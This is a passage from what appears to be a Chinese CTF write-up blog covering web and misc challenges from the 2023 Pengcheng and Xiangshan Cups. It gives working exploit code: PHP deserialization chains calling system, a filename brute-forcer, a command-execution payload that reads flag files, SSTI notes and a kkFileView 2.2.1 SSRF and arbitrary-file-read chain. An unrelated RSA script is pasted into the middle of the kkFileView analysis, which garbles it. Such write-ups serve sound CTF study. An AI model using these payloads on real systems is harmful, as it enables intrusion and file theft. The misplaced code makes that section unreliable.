class="hljs-comment">//O%3A1%3A%22H%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A1%3A%22K%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22R%22%3A5%3A%7Bs%3A9%3A%22%00R%00method%22%3Bs%3A6%3A%22syssystemtem%22%3Bs%3A7%3A%22%00R%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A3%3A%22key%22%3Bb%3A1%3Bs%3A7%3A%22finish1%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bb%3A1%3B%7Ds%3A6%3A%22finish%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7D%7D%7D%7D%7D</span><br></code></pre></td></tr></table></figure><figure><img src="/img/2023鹏城杯/169923146057815.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="web2">web2</h2><p>前端有个scandir功能，输入目录，如果有此目录返回<code>yesyesyes!!!</code>，没有此目录返回<code>nonono~~~</code></p><p>如下</p><figure><img src="/img/2023鹏城杯/16992314605611.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>前端看到有个后门文件，但是如果单纯爆破文件名要16的16次方，显然不可能</p><figure><img src="/img/2023鹏城杯/16992314605612.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>利用glob协议，匹配地找php，这样最多只要匹配16*16次即可得到文件名</p><figure><img src="/img/2023鹏城杯/16992314605613.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>借用<ahref="https://www.yuque.com/dat0u/ctf/gupiindgyz7vodib#Duoup">lxxxin</a>师傅的wp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import requests<br><br>url = <span class="hljs-string">&quot;http://172.10.0.5/&quot;</span><br><br>s = <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>filename = <span class="hljs-string">&quot;glob:///var/www/html/backdoor_&quot;</span><br><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j in s:<br>        temp = filename + j + <span class="hljs-string">&quot;*.php&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;filename&quot;</span>: temp<br>        &#125;<br>        r = requests.<span class="hljs-title function_ invoke__">post</span>(url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yes&quot;</span> in r.text:<br>            filename += j<br>            <span class="hljs-keyword">print</span>(filename + <span class="hljs-string">&quot;.php&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># glob:///var/www/html/backdoor_00fbc51dcdf9eef767597fd26119a894.php</span><br></code></pre></td></tr></table></figure><p>backdoor_00fbc51dcdf9eef767597fd26119a894.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>        <span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>||<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>,<span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$title</span>)) &lt;= <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;php &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>数组绕过</p><figure><img src="/img/2023鹏城杯/16992314605614.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=datou&amp;title[]=<span class="hljs-number">1</span>&amp;data[]=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>file_put_contents($sandbox.$title,$data);</code>将data写入<code>$sandbox.$title</code><code>system('php '.$sandbox.$title);</code>执行<code>$sandbox.$title</code></p><p>(复现的话发现好像写不进去文件)</p><h2 id="escape">Escape</h2><p>源码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from sqlite3 import *<br><br>from random import choice<br>from hashlib import sha512<br><br>from flask import Flask, request, Response<br>from flask_limiter import Limiter<br>from flask_limiter.util import get_remote_address<br><br>app = Flask(__name__)<br>limiter = Limiter(<br>    app=app,<br>    key_func=get_remote_address,<br>    default_limits=[<span class="hljs-string">&quot;50000 per hour&quot;</span>],<br>    storage_uri=<span class="hljs-string">&quot;memory://&quot;</span>,<br>)<br><br>salt = b<span class="hljs-string">&#x27;****************&#x27;</span><br><br>class PassHash(str):<br>    def __str__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>    def __repr__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>cur = con.cursor()<br>cur.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS users&quot;</span>)<br>cur.execute(<span class="hljs-string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)<br>passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(16)))<br>cur.execute(<br>    <span class="hljs-string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,<br>    (<span class="hljs-string">&quot;admin&quot;</span>, str(passhash))<br>)<br>con.commit()<br><br>@app.route(<span class="hljs-string">&#x27;/source&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;1/second&quot;</span>)<br>def <span class="hljs-built_in">source</span>():<br>    <span class="hljs-built_in">return</span> Response(open(__file__).<span class="hljs-built_in">read</span>(), mimetype=<span class="hljs-string">&quot;text/plain&quot;</span>)<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;3/second&quot;</span>)<br>def index():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> not <span class="hljs-keyword">in</span> request.args or <span class="hljs-string">&#x27;password&#x27;</span> not <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;index.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-keyword">else</span>:<br>        username = request.args[<span class="hljs-string">&quot;username&quot;</span>]<br>        new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])<br>        con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>        cur = con.cursor()<br>        res = cur.execute(<br>            <span class="hljs-string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,<br>            (username, str(new_pwd))<br>        )<br>        <span class="hljs-keyword">if</span> res.fetchone():<br>            <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;secret.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>        <span class="hljs-built_in">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span><br>                .format(user=username)<br>                .format(passhash=new_pwd)<br>                )<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, 10000)<br></code></pre></td></tr></table></figure><p>原题</p><figure><img src="/img/2023鹏城杯/16992314605625.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>不熟悉ssti，但就看这个payload，结合ai和自己的见解简单分析一下（不一定对）</p><p>因为<code>passhash=PassHash(''.join(choice("0123456789") for _ in range(16)))</code>，所以可以调用<code>__str__</code>方法</p><figure><img src="/img/2023鹏城杯/16992314605626.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后获取全局<code>&#123;passhash.__str__.__globals__&#125;</code>，里面有app对象</p><figure><img src="/img/2023鹏城杯/16992314605627.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后app内有个内置的<code>wsgi_app</code></p><figure><img src="/img/2023鹏城杯/16992314605628.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023鹏城杯/16992314605639.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到有os、sys模块</p><figure><img src="/img/2023鹏城杯/169923146056310.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这样就可以调用这些模块了，原题有提示在env中，os.environ即可</p><figure><img src="/img/2023鹏城杯/169923146056311.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="misc">MISC</h1><h2 id="我的壁纸">我的壁纸</h2><p>套娃题，拿了个一血</p><p>拿到bg.jpg</p><p>看到文件中有很多504B0304，分离出zip</p><p>拿到flag.txt、flag.wav、youshouldknowme.jpeg</p><figure><img src="/img/2023鹏城杯/169923146056312.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag.txt是snow隐写，密码为rar中的注释，得到flag3</p><figure><img src="/img/2023鹏城杯/169923146056413.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag.wav是sstv</p><p>用rx-sstv可以看到一张二维码，扫出来得到flag2</p><p>youshouldknowme.jpeg是steghide，密码在文件尾</p><figure><img src="/img/2023鹏城杯/169923146056414.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到flag1</p><p>3段flag拼起来得到最后的flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023香山杯</title>
    <link href="/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/"/>
    <url>/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="香山杯">2023香山杯</h1><h1 id="web">WEB</h1><h2 id="php_unserialize_pro">PHP_unserialize_pro</h2><p>签到题，比较简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;welcome&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;Wh0 4m I?&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;U R A BAD GUY&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title class_">Welcome</span>::<span class="hljs-variable constant_">__destruct</span>   <span class="hljs-variable">$name</span><br><span class="hljs-title class_">H4ck3r</span>::<span class="hljs-variable constant_">__toString</span>  <span class="hljs-variable">$func</span><br><span class="hljs-title class_">G00d</span>::<span class="hljs-variable constant_">__invoke</span> <br></code></pre></td></tr></table></figure><p>这里过滤了flag字符，利用more+正则匹配[0-z]绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;more+/[0-z][0-z][0-z][0-z]&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">H4ck3r</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">G00d</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="sharedbox">sharedBox</h2><p>hint：kkfileview2.2.1 的漏洞利用</p><h3 id="环境配置">环境配置</h3><p>项目地址：https://github.com/kekingcn/kkFileView</p><p>git下来后回退到2.2.1版本</p><figure><img src="/img/2023香山杯/169795243500124.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>因为我本地是windows，所以还要下载OpenOffice</p><p>https://www.openoffice.org/download/</p><p>下载安装完根据readme运行FilePreviewApplication的main方法</p><figure><img src="/img/2023香山杯/16979524349331.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="漏洞分析">漏洞分析</h3><p>访问<code>http://localhost:8012</code></p><p>原题的kkfileview部署在<code>/fileview/</code>下，本地在<code>/</code>，原题用的linux，本地为windows</p><figure><img src="/img/2023香山杯/16979524349332.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>存在3个路由</p><p><code>/onlinePreview</code>、<code>picturesPreview</code>、<code>/getCorsFile</code></p><figure><img src="/img/2023香山杯/16979524349333.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>主要漏洞点：</p><p><code>/onlinePreview</code>，在线浏览功能，这里有一个xss和ssrf的漏洞<code>picturesPreview</code>，图片预览，有xss漏洞<code>/getCorsFile</code>，任意文件读取和ssrf漏洞</p><p>具体分析：</p><ol type="1"><li>xxxxxxxxxx import gmpy2from Crypto.Util.number import <em>n =121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313r= getPrime(6)e = 65537a =11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699c=42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267p= gmpy2.next_prime(a - r)q = gmpy2.next_prime(gmpy2.next_prime(a) +r)​phi_n = (p-1)</em>(q-1)d = gmpy2.invert(e,phi_n)m =pow(c,d,n)print(long_to_bytes(m))Python</li></ol><p>支持file和http协议，而且没有过滤，造成ssrf</p><ol type="1"><li><code>/getCorsFile</code>下断点</li></ol><figure><img src="/img/2023香山杯/16979524349334.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>跟进到<code>getInputStreamFromUrl</code>这里没有过滤传入的字符，造成了任意文件读取</p><figure><img src="/img/2023香山杯/16979524349335.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以参考：https://github.com/kekingcn/kkFileView/issues/128</p><h3 id="题目分析">题目分析</h3><p>在题目的环境中对<code>getCorsFile</code>进行了限制，直接访问的话会返回403</p><p>那么就由此有了一个思路：<code>onlinePreview接口ssrf请求到getCorsFile</code>，然后任意文件读取</p><p>即<code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>但是，我们来看看实际效果</p><figure><img src="/img/2023香山杯/16979524349336.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>文件类型不支持，那么从源码里看看它为什么不支持，以及支持什么格式的文件</p><p>下个断点</p><figure><img src="/img/2023香山杯/16979524349337.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>跟进到这一段，经过<code>getFileNameFromURL</code>处理后得到文件名为<code>getCorsFile</code></p><figure><img src="/img/2023香山杯/16979524349338.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023香山杯/16979524349339.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最终传入判断后返回不支持</p><figure><img src="/img/2023香山杯/169795243493410.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>那么这也说明了无后缀文件是无法读取的，那看看支持的文件格式</p><p>看到这里，返回有picture、pdf、media等，但是这些肯定不支持文本形式的flag</p><p>然后注意到<code>simText</code>类型</p><figure><img src="/img/2023香山杯/169795243493411.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>支持<code>txt</code>、<code>jsp</code>等</p><figure><img src="/img/2023香山杯/169795243493412.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>现在引入一个知识点</p><p>spring boot的路径匹配</p><figure><img src="/img/2023香山杯/169795243493413.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>而源码中的版本恰好是1.5.8</p><figure><img src="/img/2023香山杯/169795243493414.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>那么就有了一个思路：</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>这样就会解析成</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>然后服务端又是怎么处理这个多出来的<code>.txt</code>呢</p><figure><img src="/img/2023香山杯/169795243493415.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到file目录下多了<code>getCorsFile.txt</code>，里面的内容就是要读的文件的内容</p><p>那么这个是怎么实现的呢</p><p>onlinePreview 最后调用了 <code>filePreviewHandle</code>，然后调用了<code>downLoad</code></p><figure><img src="/img/2023香山杯/169795243493416.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>downLoad</code>中利用<code>saveBytesToOutStream</code>将读的内容写入文件</p><figure><img src="/img/2023香山杯/169795243493417.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里解释了为什么会多一个<code>getCorsFile.txt.txt</code></p><figure><img src="/img/2023香山杯/169795243493418.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最后就是怎么读取<code>getCorsFile.txt</code></p><p>正常思路</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt</code></p><p>但是刚刚提到springboot特性会将<code>getCorsFile.txt</code>解析为<code>getCorsFile</code></p><p>所以用<code>%01</code>、<code>%02</code>等不可见字符（猜测是不可见字符，本地测试是可以的）绕过<code>http://localhost:8012/%01getCorsFile.txt</code></p><h3 